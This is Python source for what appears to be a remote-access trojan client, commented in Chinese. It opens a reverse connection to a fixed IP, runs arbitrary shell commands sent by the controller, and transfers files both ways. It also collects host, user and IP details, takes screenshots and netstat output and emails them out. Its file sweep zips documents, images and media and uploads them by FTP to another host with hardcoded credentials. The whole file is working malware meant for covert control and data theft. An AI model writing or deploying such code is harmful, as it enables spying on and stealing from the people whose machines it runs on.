# -*- coding:utf-8 -*-
import socket
import os
import time
import subprocess
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase #附件
from email.mime.text import MIMEText
from email import encoders #转码
from datetime import date
from email.header import Header
import sys
import getpass
import zipfile
from ftplib import FTP
from PIL import ImageGrab
# import pyscreenshot as ImageGrab




########################################################压缩打包发送############################################################

keylist = ['txt','doc','docx','pdf','pptx','xlsx','zip','rar','jpg','gif','png','bmp','mp4','mp3']
result=[]
result_txt = []
result_doc = []
result_docx = []
result_pdf = []
result_pptx = []
result_xlsx = []

result_zip = []
result_rar = []

result_jpg = []
result_gif = []
result_png = []
result_bmp = []

result_mp4 = []
result_mp3 = []
#-----------------------------------------------------函数定义部分
#连接并登录
def ftpconnect(host,port,username, password):
    ftp = FTP()
    #ftp.set_debuglevel(2)         #打开调试级别2，显示详细信息
    ftp.connect(host, port)          #连接
    ftp.login(username, password)  #登录，如果匿名登录则用空串代替即可
    return ftp
#下载文件    
def downloadfile(ftp, remotepath, localpath):  #remotepath：上传服务器路径；localpath：本地路径；
    bufsize = 1024                #设置缓冲块大小
    fp = open(localpath,'wb')     #以写模式在本地打开文件
    ftp.retrbinary('RETR ' + remotepath, fp.write, bufsize) #接收服务器上文件并写入本地文件
    ftp.set_debuglevel(0)         #关闭调试
    fp.close()                    #关闭文件
#上传文件
def uploadfile(ftp, remotepath, localpath):
    bufsize = 1024
    fp = open(localpath, 'rb')
    ftp.storbinary('STOR '+ remotepath , fp, bufsize)    #上传文件
    ftp.set_debuglevel(0)
    fp.close() 

#目录遍历函数
def SearchPath(path):
    for folder,subFolders,files in os.walk(path):
        for file in files:#文件分析
            AnalyzeFile(folder,file)
        for subFolder in subFolders:#递归遍历
            SearchPath(subFolder)     
#文件分析，是否包含指定字符串，是否压缩文件中包含keyword
def AnalyzeFile(folder,filename):
    # if file.endswith(keyword): #文件名中包含关键字
    #     result.append(folder+"\\"+file)

    if filename.endswith('.txt') :
        result_txt.append(folder+"\\"+filename)
    if filename.endswith('.doc') :
        result_doc.append(folder+"\\"+filename)
    if filename.endswith('.docx') :
        result_docx.append(folder+"\\"+filename)
    if filename.endswith('.pdf') :
        result_pdf.append(folder+"\\"+filename)
    if filename.endswith('.pptx') :
        result_pptx.append(folder+"\\"+filename)
    if filename.endswith('.xlsx') :
        result_xlsx.append(folder+"\\"+filename)

    if filename.endswith('.zip') :
        result_zip.append(folder+"\\"+filename)
    if filename.endswith('.rar') :
        result_rar.append(folder+"\\"+filename)

    if filename.endswith('.jpg') :
        result_jpg.append(folder+"\\"+filename)
    if filename.endswith('.gif') :
        result_gif.append(folder+"\\"+filename)
    if filename.endswith('.png') :
        result_png.append(folder+"\\"+filename)
    if filename.endswith('.bmp') :
        result_bmp.append(folder+"\\"+filename)

    if filename.endswith('.mp4') :
        result_mp4.append(folder+"\\"+filename)
    if filename.endswith('.mp3') :
        result_mp3.append(folder+"\\"+filename)
       
        

#-----------------------------------------------------程序流程部分

def findfile_ftp(dir):
    ftp = ftpconnect("192.168.0.106",21, "tk", "123456")

    # dir = "e:/学习。/攻防/teachergive2/第一天"
    #dir = "/root/gf"

    #开始检索
    # print("开始检索["+dir+"]目录下的文件")
    #遍历
    SearchPath(dir)
    #输出
    # print('result_txt: ',result_txt)
    # print('result_doc: ',result_doc)
    # print('result_docx: ',result_docx)
    # print('result_pdf: ',result_pdf)
    # print('result_pptx: ',result_pptx)
    # print('result_xlsx: ',result_xlsx)

    # print('result_zip: ',result_zip)
    # print('result_rar: ',result_rar)

    # print('result_jpg: ',result_jpg)
    # print('result_gif: ',result_gif)
    # print('result_png: ',result_png)
    # print('result_bmp: ',result_bmp)

    # print('result_mp4: ',result_mp4)
    # print('result_mp3: ',result_mp3)

    if result_txt:
        resultzip = zipfile.ZipFile(dir+'/_txt.zip','w')
        for i in result_txt:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_txt.zip", dir+'/_txt.zip') #上传文件
        os.remove(dir+'/_txt.zip') #删除本地文件
    if result_doc:
        resultzip = zipfile.ZipFile(dir+'/_doc.zip','w')
        for i in result_doc:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_doc.zip", dir+'/_doc.zip') #上传文件
        os.remove(dir+'/_doc.zip') #删除本地文件
    if result_docx:
        resultzip = zipfile.ZipFile(dir+'/_docx.zip','w')
        for i in result_docx:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_docx.zip", dir+'/_docx.zip') #上传文件
        os.remove(dir+'/_docx.zip') #删除本地文件
    if result_pdf:
        resultzip = zipfile.ZipFile(dir+'/_pdf.zip','w')
        for i in result_pdf:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_pdf.zip", dir+'/_pdf.zip') #上传文件
        os.remove(dir+'/_pdf.zip') #删除本地文件
    if result_pptx:
        resultzip = zipfile.ZipFile(dir+'/_pptx.zip','w')
        for i in result_pptx:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_pptx.zip", dir+'/_pptx.zip') #上传文件
        os.remove(dir+'/_pptx.zip') #删除本地文件
    if result_xlsx:
        resultzip = zipfile.ZipFile(dir+'/_xlsx.zip','w')
        for i in result_xlsx:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_xlsx.zip", dir+'/_xlsx.zip') #上传文件
        os.remove(dir+'/_xlsx.zip') #删除本地文件

    if result_zip:
        resultzip = zipfile.ZipFile(dir+'/_zip.zip','w')
        for i in result_zip:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_zip.zip", dir+'/_zip.zip') #上传文件
        os.remove(dir+'/_zip.zip') #删除本地文件
    if result_rar:
        resultzip = zipfile.ZipFile(dir+'/_rar.zip','w')
        for i in result_rar:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_rar.zip", dir+'/_rar.zip') #上传文件
        os.remove(dir+'/_rar.zip') #删除本地文件

    if result_jpg:
        resultzip = zipfile.ZipFile(dir+'/_jpg.zip','w')
        for i in result_jpg:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_jpg.zip", dir+'/_jpg.zip') #上传文件
        os.remove(dir+'/_jpg.zip') #删除本地文件
    if result_gif:
        resultzip = zipfile.ZipFile(dir+'/_gif.zip','w')
        for i in result_gif:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_gif.zip", dir+'/_gif.zip') #上传文件
        os.remove(dir+'/_gif.zip') #删除本地文件
    if result_png:
        resultzip = zipfile.ZipFile(dir+'/_png.zip','w')
        for i in result_png:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_png.zip", dir+'/_png.zip') #上传文件
        os.remove(dir+'/_png.zip') #删除本地文件
    if result_bmp:
        resultzip = zipfile.ZipFile(dir+'/_bmp.zip','w')
        for i in result_bmp:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_bmp.zip", dir+'/_bmp.zip') #上传文件
        os.remove(dir+'/_bmp.zip') #删除本地文件

    if result_mp4:
        resultzip = zipfile.ZipFile(dir+'/_mp4.zip','w')
        for i in result_mp4:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_mp4.zip", dir+'/_mp4.zip') #上传文件
        os.remove(dir+'/_mp4.zip') #删除本地文件
    if result_mp3:
        resultzip = zipfile.ZipFile(dir+'/_mp3.zip','w')
        for i in result_mp3:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_mp3.zip", dir+'/_mp3.zip') #上传文件
        os.remove(dir+'/_mp3.zip') #删除本地文件

    ftp.quit()

########################################################压缩打包发送############################################################

#########################################################发送邮件###############################################################
def fsend(data):
    today = date.today()
    date_today = today.strftime("%m%d")

    message = MIMEMultipart()
    message['From'] = "XXXX"
    #message['To'] = "XXXX"
    message['To'] = "XXXX"
    subject = "Python SMTP 邮件"+date_today
    message['Subject'] = Header(subject,'utf-8')
    message.attach(MIMEText(data))
    with open (data,'rb') as f:
        letter = MIMEBase('zip','zip',filename=data)
        letter.add_header('Content-Disposition','attachment',filename=('gb2312', '', data))
        letter.add_header('Content-ID','<0>')
        letter.add_header('X-Attachment-Id','0')
        letter.set_payload(f.read())
        encoders.encode_base64(letter)
        message.attach(letter)
    mail_host = "smtp.qq.com"
    mail_user = "XXXX"
    mail_pass = "XXXX"
    server = "XXXX"
    #receiver = ["XXXX"]
    receiver = ["XXXX"]
    try:
        smtpobj = smtplib.SMTP()
        # print("beginlogin0")
        smtpobj.connect(mail_host,25)
        # print("beginlogin")
        smtpobj.login(mail_user,mail_pass)
        # print("emaillogin")
        smtpobj.send_message(message)
        # print("邮件发送成功")
    except smtplib.SMTPException:
        # print('Error:发送失败！')
        pass
#########################################################发送邮件#################################################################


#########################################################收集信息#################################################################

def package_get():
    hostname=socket.gethostname()
    result=socket.getaddrinfo(hostname,None,0,socket.SOCK_STREAM)   
    Fully_qualified_name = socket.getfqdn(hostname)
    user_name = getpass.getuser() # 获取当前用户名
    IP_address =""
    for x in range(0,len([x[4][0] for x in result])):
        IP_address = IP_address +"\n"+ ''.join([x[4][0] for x in result][x])
    f= open("package_get.txt","w")
    f.write("hostname is:"+hostname+'\n'+ "Fully_qualified name:"+socket.getfqdn(hostname)+'\n'+"当前用户名:"+user_name+'\n'+"IP address:"+IP_address)
    f.close()
    #print("hostname is:"+hostname+'\n'+ "Fully_qualified name:"+socket.getfqdn(hostname)+'\n'+"当前用户名:"+user_name+'\n'+"IP address:"+IP_address)
    fsend("package_get.txt")

#########################################################收集信息#################################################################


########################################################截屏发服务################################################################
def can_do():
    
    bbox = (0, 0, 1920, 1080)  
    im1 = ImageGrab.grab(bbox)  
    im1.save('cut_screen.png')
    im2 = ImageGrab.grab(bbox)
    fsend("cut_screen.png")
    
    fd = open("port.txt","w")
    f = os.popen("netstat -an", "r")
    shuchu = f.read()
    fd.write(shuchu)
    fd.close
    f.close()
    time.sleep(3)
    fsend("port.txt")

########################################################截屏发服务################################################################

##############################################################文件传输与发送#######################################################

def creat_folder(path):
    if os.path.exists(path):
        return
    else:
        os.mkdir(path)


def send_handle(file_name, file_size, client_server):
    """
    处理传输文件数据，将文件读取并发送到接收端，只允许单次发送
    单次发送失败后需要进行重连再重新发送
    :param file_name: 要发送的文件名
    :param file_size: 要发送的文件的大小
    :param client_server: 用于传输数据的socket，发送端的socket
    :return: 发送文件的结果，1为发送成功，0为发送失败
    """
    al_read_size = 0  # 保存已读取的文件大小，显示读取的进度
    if file_name and file_size:
        # 判断传入的文件信息是否空
        client_server.send(b"starting send file")
        with open(file_name, "rb") as f:
            while True:
                # 循环读取文件
                file_content = f.read(1048576)  # 每次从文件种读取1M数据
                al_read_size += len(file_content)  # 计算总共读取的数据的大小
                if file_content:  # 判断文件是否读取完了
                    #print("{}%".format(al_read_size/file_size))  # 输出读取文件的进度
                    client_server.send(file_content)  # 将读取的文件发送到服务端
                else:
                    #print("100%")  # 判断文件读取完了，输出读取的进度
                    return 1  # 文件读取发送完了，返回处理情况
    else:
        #print("Can't find the file or the file is empty.")  # 打开文件失败，文件或文件名为空，则退出发送服务
        client_server.send(b'cancel send file.')  # 通知服务端取消文件的发送
        return 0  # 文件未发送成功，返回0


def send_server(client_server,file_name):
    # 输入需要发送的文件名，包括文件后缀。仅限二进制文件，包括图片、视频、压缩文件等
    # file_name = input("Please enter the file path or the file name:")
    if os.path.exists(file_name) and (not os.path.isdir(file_name)):  # 判断文件是否存在，是否文件夹
        # 获取文件的大小
        file_size = os.path.getsize(file_name)
        file_message = file_name + "|" + str(file_size)
        # 与服务端建立连接后，先将文件名字与文件的大小发送给服务端
        client_server.send(file_message.encode())
        # 对方接收到了file_message的信息后返回一个“copy”，接收不成功会返回别的信息
        recv_data = client_server.recv(1024)
        # 判断对方是否接收信息成功
        if recv_data.decode() == "copy":
            #print("start to send data...")
            start_time = time.time()  # 计算发送文件的开始时间
            send_flag = send_handle(file_name, file_size, client_server)  # 发送文件的请求处理，返回处理结果
            end_time = time.time()  # 计算发送文件的结束时间
            spend_time = end_time - start_time  # 计算发送文件的耗时
            #print("sending file spend {} s".format(spend_time))  # 在控制台输出发送文件的耗时

            if send_flag:  # 判断文件是否发送成功
                recv_message = client_server.recv(1024).decode()
                if recv_message == "ok":
                    # 文件发送成功
                    #print("send file successful, close the client server.")
                    # client_server.close()
                    return 1
                else:
                    # 对方文件接收不成功
                    #print("server recv file failed.")
                    # client_server.close()
                    return 0
            else:
                # 文件发送不成功
                #print("Error,failed to send the file.")
                # client_server.close()
                return 0

        else:
            # 对方没有接收到文件名及文件大小，或者对方断开了连接，取消发送文件，并关闭socket，退出发送服务
            #print("Can't recv the server answer.")
            #print("The client don't send the file data and close the server.")
            # client_server.close()
            return 0
    # try:
    #     client_server.close()  # 尝试关闭本方的socket，防止前面没有进行关闭，如果前面已经关闭了，直接退出函数
    # except Exception:
    #     pass
    else:
    	#print("no this file")
    	client_server.send(b'no this file.')
    	return


def recv_handle(file_path, file_size, client_server):
    """
    接收文件的处理函数，只允许单次接收，一次接收失败后需要重新建立连接后重新发送
    :param file_path: 保存文件的路径
    :param file_size: 要接收的文件的大小
    :param client_server: 传输服务的socket
    :return: 接收文件的结果，1表示接收成功，0表示接收失败
    """
    #print("Start to recv th file...",file_size)
    file_size = int(file_size)
    recv_size = 0  # 保存接收的文件的大小
    start_time = time.time()  # 保存开始接收文件的时间
    with open(file_path, "ab") as f:
        while recv_size < file_size:
            # 循环接收文件数据
            file_content = client_server.recv(file_size+1)
            if recv_size < file_size:  # 判断文件是否接收完了
                recv_size += len(file_content)  # 累计接收的文件大小
                f.write(file_content)  # 将接收的数据保存到文件中
            else:
                # 如果文件接收完了，则退出循环
                end_time = time.time()  # 保存文件接收结束的时间
                #print("spend time:{}".format(end_time - start_time))
                break

    if recv_size == file_size:  # 判断接收的文件大小与对方发送的文件大小是否一致
    	end_time = time.time()
    	#print("文件全部接收完毕，耗时：{}".format(end_time - start_time))
    	client_server.send(b'ok')
    	f.close()
    	return 1
    else:
        #print("文件未接收完成，只接收了{}%".format(recv_size/file_size))
        #print("Failed to recv the file.")
        client_server.send(b'fail')
        return 0


def recv_server(client_server):
    #print("Ready to recv the file...")
    # 接收发送端发送的文件名及文件大小
    recv = client_server.recv(1024).decode()
    if recv == "no this file.":
    	return
    
    
    file_name, file_size = recv.split("|")
    creat_folder("Resource")
    file_path = os.path.join("Resource", file_name)
    # 判断文件名及文件大小是否为空
    if file_name and file_size:
        client_server.send(b'copy')  # 反馈文件发送端，已收到文件名及文件大小
        start_flag = client_server.recv(1024).decode()
        #print("start_flag",start_flag)
        if start_flag == "starting send file":
            recv_flag = recv_handle(file_path, file_size, client_server)  # 启用文件接收服务
            # 判断文件的接收结果
            if recv_flag:
                #client_server.close()
                #print("文件接收成功，断开连接")
                return
            # else:
                #print("文件接收失败，断开连接")
                #client_server.close()
        else:
            #print("对方拒绝发送文件，取消连接")
            #client_server.close()
            return
    else:
        # 文件名或文件大小为空，拒绝接收文件，断开连接
        client_server.send(b'refuse')
        # client_server.colse()
        return

##############################################################文件传输与发送#######################################################

def send(socket, message):
    send_data = message.encode("gbk")
    # 发送数据
    socket.send(send_data)
    
def execute(cmd):
    # print(cmd)
    if cmd:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

        out,err = proc.communicate()
        result = str(out) + str(err)
        length = str(len(result)).zfill(16)
        stdoutput = (result)
        #stdoutput = str(sproc.stdout.read())+str(proc.stderr.read())

    else:

        stdoutput = "Enter a command!"

    return stdoutput

def main():
    # 创建tcp客户端套接字
    # 1. AF_INET：表示ipv4
    # 2. SOCK_STREAM: tcp传输协议
    tcp_client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # 和服务端应用程序建立连接
    # connect方法需要传入一个元组对象，元组的元素为服务端的IP地址，服务端的端口号
    tcp_client_socket.connect(("192.168.199.133", 8988))
    # 客户端与服务端建立连接的过程是一直处于阻塞的，直到建立连接

    # 代码执行到此，说明连接建立成功
    # 准备发送的数据
    send_data = "你好服务端，我是客户端!".encode("gbk")
    # 发送数据
    tcp_client_socket.send(send_data)
    # 接收数据, 这次接收的数据最大字节数是1024
    recv_data = tcp_client_socket.recv(1024)
    # 返回的直接是服务端程序发送的二进制数据
    #print(recv_data)
    # 对数据进行解码
    recv_content = recv_data.decode("gbk")
    #print("接收服务端的数据为:", recv_content)
    tcp_client_socket.send(send_data)
    while True:
        recv_data = tcp_client_socket.recv(1024)
        recv_content = recv_data.decode("gbk")
        # print("recv",recv_content)
        
        if recv_content == "quit":
            send(tcp_client_socket, "quit")

        elif recv_content == "":
            stdoutput = ""
            time.sleep(0.5)

        elif recv_content.startswith("cd ") == True:
            try:    
                os.chdir(recv_content[3:])
                # In the end we need to encrypt stdoutput, so success no output
                stdoutput = 'changed dir'

            except Exception as e:
                stdoutput = "Error changing dir {0}\n".format(recv_content[3:])+str(e)
            send(tcp_client_socket,stdoutput)

        elif recv_content.startswith("upload ") == True:
            recv_server(tcp_client_socket)
            send(tcp_client_socket, "done")

        elif recv_content.startswith("download ") == True:
            file_name = recv_content[9:].rstrip()
            
            send_server(tcp_client_socket,file_name)
            send(tcp_client_socket, "done")

        elif recv_content.startswith("hostpacket") == True:
            package_get()
            send(tcp_client_socket, "done")

        elif recv_content.startswith("findfile ") == True:
            dir = recv_content[9:].rstrip()
            findfile_ftp(dir)
            send(tcp_client_socket, "done")

        elif recv_content.startswith("cut") == True:
            can_do()
            send(tcp_client_socket, "done")
        elif recv_content.startswith("crack") == True:
            send(tcp_client_socket, "done")
        elif recv_content.startswith("help") == True:
            send(tcp_client_socket, "done")
            

        else:
            try:
                stdoutput = execute(recv_content)

            except:
                stdoutput = "Error command input {0}".format(recv_content)

            send(tcp_client_socket, stdoutput)
            

    # 关闭套接字
    tcp_client_socket.close()
if __name__ == "__main__":
    main()